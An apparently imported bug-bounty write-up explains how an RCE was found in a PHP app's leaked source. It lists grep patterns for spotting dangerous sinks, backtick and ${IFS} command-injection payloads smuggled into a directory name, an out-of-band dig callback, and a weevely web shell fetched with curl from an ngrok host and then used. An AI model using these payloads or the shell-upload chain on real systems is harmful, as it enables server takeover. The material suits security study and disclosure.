---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-05-16_hardcore-rce-via-directory-name-for-3000.md
original_filename: 2023-05-16_hardcore-rce-via-directory-name-for-3000.md
title: Hardcore RCE via directory name for $3.000
category: documents
detected_topics:
- command-injection
- xss
- sqli
- path-traversal
- api-security
tags:
- imported
- documents
- command-injection
- xss
- sqli
- path-traversal
- api-security
language: en
raw_sha256: 27d01273a035d16790789704f61ae483960a68bd54b7df515a430ce76f614129
text_sha256: 57f8f7b4b2f86406009c49fa02a035795331720120b1645ccc5d6f912920fa66
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: false
---

# Hardcore RCE via directory name for $3.000

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-05-16_hardcore-rce-via-directory-name-for-3000.md
- Source Type: markdown
- Detected Topics: command-injection, xss, sqli, path-traversal, api-security
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: False
- Raw SHA256: `27d01273a035d16790789704f61ae483960a68bd54b7df515a430ce76f614129`
- Text SHA256: `57f8f7b4b2f86406009c49fa02a035795331720120b1645ccc5d6f912920fa66`


## Content

---
title: "Hardcore RCE via directory name for $3.000"
page_title: "Hardcore RCE in leaked PHP source code for $3.000 | by Lev Shmelev | Medium"
url: "https://medium.com/@levshmelevv/hardcore-rce-via-directory-name-for-3-000-225ed58b41a9"
authors: ["Lev Shmelev"]
bugs: ["RCE", "OS command injection", "Security code review"]
bounty: "3,000"
publication_date: "2023-05-16"
added_date: "2023-05-18"
source: "pentester.land/writeups.json"
original_index: 1149
scraped_via: "browseros"
---

# Hardcore RCE via directory name for $3.000

Hardcore RCE in leaked PHP source code for $3.000
Lev Shmelev
Follow
6 min read
·
May 16, 2023

240

2

Press enter or click to view image in full size

This writeup could be considered a continuation of my previous findings for $10,000.
Previously, I was able to access the source code through an exposed .git directory where the RCE vulnerability was located. After I explored the vulnerability, I continued to examine the code in search of other vulnerabilities.
Luckily, I found another, more complex RCE, through the directory creation functionality.
You’ll like it=)

Note: I recommend reading my previous writeup to understand how I gained access to the web application’s source code.”

First of all, to find vulnerabilities in the source code, you need to identify potential entry points. Tools like SonarQube can be used for this purpose, but I prefer using old school grep.

Here are a couple of examples for PHP:

XSS:

grep -Ri "\$_" . | grep "echo"
grep -Ri "\$_GET" . | grep "echo"
grep -Ri "\$_POST" . | grep "echo"
grep -Ri "\$_REQUEST" . | grep "echo"

Command execution:

grep -Ri "shell_exec(" .
grep -Ri "system(" .
grep -Ri "exec(" .

Code execution:

grep -Ri "eval(" .
grep -Ri "assert(" .
grep -Ri "preg_replace" . | grep "/e"

SQL Injection:

grep -Ri "\$sql" .
grep -Ri "\$sql" . | grep "\$_"

RFI/LFI:

grep -Ri "file_include" .
grep -Ri "include(" .
grep -Ri "require(" .
grep -Ri "include_once(" .
grep -Ri "require_once(" .
grep -Ri "require_once(" . | grep "\$_"

Chapter 1

After scanning the code, I focused on this section, where the @exec() function is used. Through this function, I’ll attempt to gain RCE.

Press enter or click to view image in full size

The purpose of this code is to determine the sizes of the files. First of all, on line 40, scandir() is called, returning an array of directory contents. Next, the names of files and directories are filtered through preg_replace() and sent to the filesize64() function, where the @exec() call is located.

Very cool, but this code does not accept any user input for injection, except for the contents of the /home/html/ftp-upload/uploads/OELxI386/ directory, over which I have no control. Therefore, I set this code aside for a few weeks…

Chapter 2

After a while, I decided to double-check how my previous RCE was fixed on this resource. I tried using different payloads and accidentally discovered that if I specify two values separated by a space (test%20somename) in the adduser parameter, such as in this URL:
http://example.com/ftp-upload/sync.php?adduser=test%20someuser&secret1=[secret1]&secret2=[secret2] — the value after the space will be used to create a directory with the same name in the same location as the PHP file.

The code that is responsible for this:

Press enter or click to view image in full size

Thus, passing values with a space, the code for creating a directory will look like this:

mkdir /home/html/ftp-upload/uploads/test somename
Chapter 3

The ability to create my own directories led me to the idea of using this to inject a payload into @exec() and use this chain to achieve RCE.

The first thought was to try creating a directory with a payload in the name, which will send a request to my server.
If the request arrives, then the code has been successfully executed.

For this, I used the dig command:

dig%20rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com

And in order for a directory with such a name to be read by scandir(), we create it in uploads/OELxI386/

Request:

http://example.com/ftp-upload/sync.php?adduser=test%20uploads/OELxI386/dig%20rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com&secret1=[secret1]&secret2=[secret2]

But nothing worked because of the use of a space in the payload, when it gets into the mkdir command, the space separates the payload and creates three directories:

mkdir /home/html/ftp-upload/uploads/test uploads/OELxI386/dig rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com

Therefore, our payload should not include spaces, they can be replaced with ${IFS}.

Final request:

http://example.com/ftp-upload/sync.php?adduser=test%20uploads/OELxI386/`dig${IFS}rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com`&secret1=[secret1]&secret2=[secret2]

Press enter or click to view image in full size

Great!
The directory with the payload in the name has been created and now it’s necessary to run the script with the vulnerable function that reads the contents of the directory. For this, we need to go to http://example.com/ftp-upload/testSize.php

Get Lev Shmelev’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

We see that the script has worked:

And the request has successfully arrived. This is RCE!

Press enter or click to view image in full size

Let’s repeat what happened here:

We send a request to create a directory with the payload in the place we need:
http://example.com/ftp-upload/sync.php?adduser=test%20uploads/OELxI386/dig${IFS}rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com&secret1=[secret1]&secret2=[secret2]
The payload is sent to the script that creates the directory.
3.

The command that will be executed on the server side is:

mkdir /home/html/ftp-upload/uploads/test uploads/OELxI386/dig${IFS}rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com

3. We start the directory reading script:
http://example.com/ftp-upload/testSize.php

The script reads the contents of the directory /home/html/ftp-upload/uploads/OELxI386/ (into which we uploaded the payload)
and passes it to the filesize64() function where the call of the code with our payload happens.

Press enter or click to view image in full size

It is passed to the filesize64() function where the call of the code with our payload occurs.

Press enter or click to view image in full size
Chapter 4

All that’s left is to upload a shell for unimpeded code execution on the server.

Let’s move on to the reproduction steps:

Create a shell using weevely and save it as txt
weevely generate 123pass shell.txt

2. Create an index.php file that will be used on our server to upload the shell.

<?php
$attachment_location = "shell.txt";
if (file_exists($attachment_location)) {
header($_SERVER["SERVER_PROTOCOL"] . " 200 OK");
header("Cache-Control: public");
header("Content-Type: plane/text");
header("Content-Transfer-Encoding: Binary");
header("Content-Length:".filesize($attachment_location));
header("Content-Disposition: attachment; filename=shell.php");
readfile($attachment_location);
die();
} else {
die("Error: File not found.");
}

When making a request to this script, the vulnerable server will take our shell.txt and save it as shell.php. In this way, shell.php will be uploaded to the vulnerable server.

3. Set up a local PHP server and tunnel the connection using ngrok

php -S 127.0.0.1:8889 index.php
ngrok http -subdomain=rce 8889 -scheme http -scheme https

4. The last step is to create the final payload that will upload our shell to the server.
Since the server still has filtering, it took a bit of brainstorming, and as a result, I got the following payload:

uploads/OELxI386/`cd${IFS}errors%26%26curl${IFS}rce.eu.ngrok.io${IFS}-o${IFS}shell.php`

The payload will execute the following commands on the vulnerable server:

cd errors #To go to a writable directory
curl rce.eu.ngrok.io -o shell.php #The command that will download the shell to the vulnerable server

Since the server uses filtering in the form of the preg_match(‘/[\/:”*?<>|]+/’, $f), it was not possible to use slashes in the code.

Result:
http://example.com/ftp-upload/sync.php?adduser=test%20uploads/OELxI386/`cd${IFS}errors%26%26curl${IFS}rce.eu.ngrok.io${IFS}-o${IFS}shell.php`&secret1=[secret1]&secret2=[secret2]

Press enter or click to view image in full size

5. We invoke the script to execute the code
http://example.com/ftp-upload/testSize.php

After which, we receive a request on our server

Press enter or click to view image in full size

And we check the errors/ directory for the presence of the shell

Press enter or click to view image in full size

And it’s there!

6. All that’s left is to connect to it and execute commands

weevely http://example.com/ftp-upload/errors/shell.php 123pass
Press enter or click to view image in full size

Now we can go celebrate at the nearby bar.

After a few days of corrections, the team rewarded me with a bounty (as is traditional, a motivational screenshot =))

Press enter or click to view image in full size

This time they paid me a lot less than I expected, and the company explained it like this:

This is the downside of bug hunting on self-hosted platforms.

I hope I was able to clearly tell you about a interesting case with vulnerability exploitation. Happy hunting and lots of bounty to everyone!

Reach me on Linkedin
